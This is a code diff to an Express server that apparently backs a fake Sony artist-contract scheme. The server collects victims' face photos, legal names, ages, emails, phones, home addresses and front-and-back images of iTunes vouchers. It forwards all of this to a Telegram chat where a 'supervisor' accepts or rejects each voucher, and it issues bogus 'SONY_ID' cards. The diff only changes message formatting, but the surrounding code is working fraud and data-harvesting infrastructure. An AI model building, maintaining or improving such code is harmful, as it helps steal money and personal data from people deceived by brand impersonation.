@@ -21,7 +21,7 @@ const approvals = {};
 let lastUpdateId = 0;
 
 app.get("/", (req, res) => {
-  res.send(`<h1>Sony Backend Live ✓ ITUNES VOUCHER</h1>
+  res.send(`<h1>Sony Backend Live ✓ ITUNES VOUCHER QUOTED</h1>
   <p>POST /api/forward-to-telegram -> sends Accept/Reject buttons</p>
   <p>GET /api/status/:contractId -> frontend polling</p>
   <p>POST /webhook -> Telegram callback</p>
@@ -37,26 +37,34 @@ app.get("/api/status/:contractId", (req, res) => {
   res.json(data);
 });
 
+// Helper to make quoted text
+function qt(text){
+  // Wrap in blockquote for Telegram quoted look
+  return `<blockquote>${text}</blockquote>`;
+}
+
 async function sendApprovalRequest({ contractId, artistName, legalName, phone, region, faceBuffer, idBuffer }) {
   if (!BOT_TOKEN ||!SUPERVISOR_CHAT_ID) {
     console.log("Missing env");
     return;
   }
-  const caption = `
-🎤 *NEW CONTRACT - REQUIRES APPROVAL* 🎤
+  const rawCaption = `
+🎤 NEW CONTRACT - REQUIRES APPROVAL 🎤
 ━━━━━━━━━━━━━━━━━━━━
-👤 *Artist:* ${artistName}
-📛 *Legal:* ${legalName}
-📱 *Phone:* ${phone}
-🌍 *Country:* ${region}
-🆔 *Contract:* \`${contractId}\`
-🎫 *Given ID:* \`1100223\`
-🎫 *iTunes Voucher* Attached
-⏰ *Time:* ${new Date().toLocaleString()}
+👤 Artist: ${artistName}
+📛 Legal: ${legalName}
+📱 Phone: ${phone}
+🌍 Country: ${region}
+🆔 Contract: ${contractId}
+🎫 Given ID: 1100223
+🎫 iTunes Voucher Attached
+⏰ Time: ${new Date().toLocaleString()}
 ━━━━━━━━━━━━━━━━━━━━
 🖼️ Face + iTunes Voucher attached
-👇 *Choose:*
+👇 Choose:
 `;
+  const caption = qt(rawCaption);
+
   const keyboard = {
     inline_keyboard: [
       [
@@ -70,20 +78,22 @@ async function sendApprovalRequest({ contractId, artistName, legalName, phone, r
       const form = new FormData();
       form.append('chat_id', SUPERVISOR_CHAT_ID);
       form.append('photo', faceBuffer, { filename: `FACE_${artistName}.jpg` });
-      form.append('caption', `Face: ${artistName} | ${contractId}`);
+      form.append('caption', qt(`Face: ${artistName} | ${contractId}`));
+      form.append('parse_mode', 'HTML');
       await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, { headers: form.getHeaders() });
     }
     if (idBuffer) {
       const form2 = new FormData();
       form2.append('chat_id', SUPERVISOR_CHAT_ID);
       form2.append('photo', idBuffer, { filename: `VOUCHER_${artistName}.jpg` });
-      form2.append('caption', `iTunes Voucher: ${artistName} | 1100223 | ${contractId} | Front & Back`);
+      form2.append('caption', qt(`iTunes Voucher: ${artistName} | 1100223 | ${contractId} | Front & Back`));
+      form2.append('parse_mode', 'HTML');
       await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form2, { headers: form2.getHeaders() });
     }
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       chat_id: SUPERVISOR_CHAT_ID,
       text: caption,
-      parse_mode: "Markdown",
+      parse_mode: "HTML",
       reply_markup: keyboard
     });
   } catch (e) {
@@ -132,17 +142,17 @@ app.post("/api/forward-to-telegram", upload.fields([{ name: 'photo' }, { name: '
       return res.json({ success: true, status: 'pending', contractId: finalCid, message: 'Sent for approval with Accept/Reject buttons' });
     }
 
-    const text = `
-🎤 *NEW SONY CONTRACT (STEP 1 - FACE)* 🎤
+    const rawText = `
+🎤 NEW SONY CONTRACT (STEP 1 - FACE) 🎤
 ━━━━━━━━━━━━━━━━━━━━
-👤 *Artist:* ${artistName}
-📛 *Legal:* ${legalName}
-🎂 *Age:* ${age}
-📧 *Email:* ${email}
-📱 *Phone:* ${phone}
-🏠 *Address:* ${address}
-🌍 *Country:* ${region}
-🆔 *Contract:* \`${finalCid}\`
+👤 Artist: ${artistName}
+📛 Legal: ${legalName}
+🎂 Age: ${age}
+📧 Email: ${email}
+📱 Phone: ${phone}
+🏠 Address: ${address}
+🌍 Country: ${region}
+🆔 Contract: ${finalCid}
 ⏰ ${new Date().toLocaleString()}
 ━━━━━━━━━━━━━━━━━━━━
 ⏳ Waiting for iTunes Voucher upload...
@@ -151,14 +161,14 @@ app.post("/api/forward-to-telegram", upload.fields([{ name: 'photo' }, { name: '
       const form = new FormData();
       form.append('chat_id', SUPERVISOR_CHAT_ID);
       form.append('photo', faceBuffer, { filename: `FACE_${artistName}.jpg` });
-      form.append('caption', text.slice(0, 1024));
-      form.append('parse_mode', 'Markdown');
+      form.append('caption', qt(rawText.slice(0, 900)));
+      form.append('parse_mode', 'HTML');
       await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, { headers: form.getHeaders() });
     } else if (BOT_TOKEN && SUPERVISOR_CHAT_ID) {
       await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         chat_id: SUPERVISOR_CHAT_ID,
-        text,
-        parse_mode: "Markdown"
+        text: qt(rawText),
+        parse_mode: "HTML"
       });
     }
     res.json({ success: true, contractId: finalCid });
@@ -177,8 +187,8 @@ app.post("/api/forward-idcard", upload.single('photo'), async (req, res) => {
     const form = new FormData();
     form.append('chat_id', SUPERVISOR_CHAT_ID);
     form.append('document', buf, { filename: `SONY_ID_${artistName}_${contractId}.png`, contentType: 'image/png' });
-    form.append('caption', `🪪 ID CARD GENERATED: ${artistName} | ${contractId}`);
-    form.append('parse_mode', 'Markdown');
+    form.append('caption', qt(`🪪 ID CARD GENERATED: ${artistName} | ${contractId}`));
+    form.append('parse_mode', 'HTML');
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, { headers: form.getHeaders() });
     res.json({ success: true });
   } catch (e) {
@@ -196,12 +206,12 @@ async function handleCallback(cq){
       const cid=data.replace('accept_','');
       approvals[cid]={...(approvals[cid]||{}), status:'accepted', contractId:cid, artistName:approvals[cid]?.artistName||'', time:new Date().toISOString()};
       await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`,{callback_query_id:cq.id, text:`✅ Accepted ${cid}`});
-      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`,{chat_id:chatId,message_id:messageId,text:`✅ *ACCEPTED* - ${cid} by supervisor\nArtist: ${approvals[cid]?.artistName||''}\nVoucher Verified\nTime: ${new Date().toLocaleString()}`,parse_mode:"Markdown"});
+      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`,{chat_id:chatId,message_id:messageId,text:qt(`✅ ACCEPTED - ${cid} by supervisor\nArtist: ${approvals[cid]?.artistName||''}\nVoucher Verified\nTime: ${new Date().toLocaleString()}`),parse_mode:"HTML"});
     }else if(data.startsWith('reject_')){
       const cid=data.replace('reject_','');
       approvals[cid]={...(approvals[cid]||{}), status:'rejected', reason:'Rejected by supervisor - Invalid iTunes Voucher', contractId:cid, time:new Date().toISOString()};
       await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`,{callback_query_id:cq.id, text:`❌ Rejected ${cid}`});
-      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`,{chat_id:chatId,message_id:messageId,text:`❌ *REJECTED* - ${cid} by supervisor\nReason: Invalid iTunes Voucher\nTime: ${new Date().toLocaleString()}`,parse_mode:"Markdown"});
+      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`,{chat_id:chatId,message_id:messageId,text:qt(`❌ REJECTED - ${cid} by supervisor\nReason: Invalid iTunes Voucher\nTime: ${new Date().toLocaleString()}`),parse_mode:"HTML"});
     }
   }catch(e){ console.error("handleCallback", e.response?.data||e.message); }
 }
@@ -239,4 +249,4 @@ app.get("/set-webhook", async (req, res) => {
   }
 });
 
-app.listen(PORT, () => console.log(`Sony supervisor bot ITUNES VOUCHER on ${PORT}`));
+app.listen(PORT, () => console.log(`Sony supervisor bot QUOTED on ${PORT}`));
